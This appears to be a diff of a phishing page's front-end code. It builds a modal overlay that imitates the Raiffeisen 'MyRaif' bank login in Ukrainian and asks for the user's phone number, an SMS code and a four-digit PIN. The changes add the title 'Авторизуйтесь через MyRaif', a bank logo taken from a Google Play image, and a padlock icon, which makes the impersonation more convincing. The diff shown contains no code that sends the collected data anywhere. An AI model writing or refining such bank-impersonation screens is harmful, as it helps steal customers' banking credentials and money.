@@ -351,12 +351,16 @@
             width: 100%;
             flex-shrink: 0;
         }
-        .raiff-header .back-arrow, .raiff-header .support-icon {
+        .raiff-header .back-arrow {
             cursor: pointer;
         }
         .raiff-header .title {
             font-size: 17px; font-weight: 600;
             position: absolute; left: 50%; transform: translateX(-50%);
+        }
+        .raiff-header .raiff-header-logo {
+            max-height: 30px;
+            border-radius: 50%;
         }
         .raiff-content-wrapper {
             flex-grow: 1;
@@ -525,12 +529,11 @@ document.addEventListener('DOMContentLoaded', () => {
     function renderRaiffPhoneScreen() {
         const html = `
             <div class="raiff-header">
-                <span class="back-arrow" id="raiff-back-btn"></span>
-                <span class="support-icon" id="raiff-support-btn">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 13.8214 2.48697 15.5291 3.33782 17L2.5 21.5L7 20.6622C8.47087 21.513 10.1786 22 12 22Z" stroke="#F2F2F7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
+                <span class="back-arrow" id="raiff-back-btn">
+                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="#F2F2F7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
+                <span class="title">Авторизуйтесь через MyRaif</span>
+                <img src="https://play-lh.googleusercontent.com/V38tEbHeQp7X7_yUvhjOSU8CBlDwMwZag0uHvaoKUuTpZvObZvMDKx1AcIvXbo1ueA" class="raiff-header-logo" alt="Логотип банку">
             </div>
             <div class="raiff-content-wrapper">
                 <div class="raiff-icon-container">
@@ -550,6 +553,10 @@ document.addEventListener('DOMContentLoaded', () => {
         raiffModalContent.innerHTML = html;
         raiffModalOverlay.style.display = 'flex';
         
+        document.getElementById('raiff-back-btn').addEventListener('click', () => {
+            raiffModalOverlay.style.display = 'none';
+        });
+
         const phoneInput = document.getElementById('raiff-phone-input');
         const phoneGroup = document.getElementById('raiff-phone-group');
         const continueBtn = document.getElementById('raiff-continue-btn');
@@ -575,8 +582,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 renderRaiffSmsScreen(phone);
             }
         });
-
-        document.getElementById('raiff-back-btn').style.visibility = 'hidden';
     }
 
     function renderRaiffSmsScreen(phone) {
@@ -586,10 +591,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 <span class="back-arrow" id="raiff-back-btn">
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="#F2F2F7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
-                <span class="title">Підтвердження</span>
-                <span class="support-icon" id="raiff-support-btn">
-                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 13.8214 2.48697 15.5291 3.33782 17L2.5 21.5L7 20.6622C8.47087 21.513 10.1786 22 12 22Z" stroke="#F2F2F7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-                </span>
+                <span class="title">Авторизуйтесь через MyRaif</span>
+                <img src="https://play-lh.googleusercontent.com/V38tEbHeQp7X7_yUvhjOSU8CBlDwMwZag0uHvaoKUuTpZvObZvMDKx1AcIvXbo1ueA" class="raiff-header-logo" alt="Логотип банку">
             </div>
             <div class="raiff-content-wrapper">
                 <div class="raiff-icon-container">
@@ -646,12 +649,17 @@ document.addEventListener('DOMContentLoaded', () => {
                 <span class="back-arrow" id="raiff-back-btn">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="#F2F2F7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
-                 <span class="support-icon" id="raiff-support-btn">
-                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 13.8214 2.48697 15.5291 3.33782 17L2.5 21.5L7 20.6622C8.47087 21.513 10.1786 22 12 22Z" stroke="#F2F2F7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-                </span>
+                <span class="title">Авторизуйтесь через MyRaif</span>
+                <img src="https://play-lh.googleusercontent.com/V38tEbHeQp7X7_yUvhjOSU8CBlDwMwZag0uHvaoKUuTpZvObZvMDKx1AcIvXbo1ueA" class="raiff-header-logo" alt="Логотип банку">
             </div>
             <div class="raiff-content-wrapper">
-                <h2 class="raiff-main-title" style="margin-top:40px;">Введіть пароль</h2>
+                <div class="raiff-icon-container" style="margin: 20px 0 20px;">
+                    <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="5" y="11" width="14" height="10" rx="2" stroke="#FFCC00" stroke-width="1.5"/>
+                        <path d="M7 11V7C7 4.23858 9.23858 2 12 2C14.7614 2 17 4.23858 17 7V11" stroke="#FFCC00" stroke-width="1.5" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                <h2 class="raiff-main-title" style="margin-top:0;">Введіть пароль</h2>
                 <div class="raiff-pin-dots" id="raiff-pin-dots">
                     ${Array(4).fill('<div class="raiff-pin-dot"></div>').join('')}
                 </div>
